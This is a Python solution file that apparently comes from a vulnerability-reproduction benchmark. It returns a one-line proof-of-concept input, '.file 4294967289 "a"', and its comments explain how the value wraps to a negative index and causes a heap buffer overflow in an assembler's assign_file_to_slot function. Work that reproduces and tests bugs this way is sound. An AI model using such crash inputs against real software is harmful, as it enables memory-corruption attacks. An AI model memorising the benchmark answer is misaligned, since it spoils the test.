class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap buffer overflow in the assign_file_to_slot
        # function when handling .file directives. A large integer value for the
        # file number, such as 4294967289, is misinterpreted.
        #
        # The parameter `i` for the file number is a signed integer. When the
        # value 4294967289 (which is 2^32 - 7) is passed, it overflows and
        # wraps around to -7 in a 32-bit signed integer representation.
        # This negative index is then used to access an array on the heap,
        # resulting in an out-of-bounds write before the start of the buffer.
        #
        # The PoC consists of a single line:
        # .file <number> "<filename>"
        # - We use the number 4294967289 as it's mentioned in the description.
        # - We use a minimal filename "a" to keep the PoC size small for a
        #   better score.
        # - A newline character is added at the end as is standard for text-based
        #   input formats.
        return b'.file 4294967289 "a"\n'
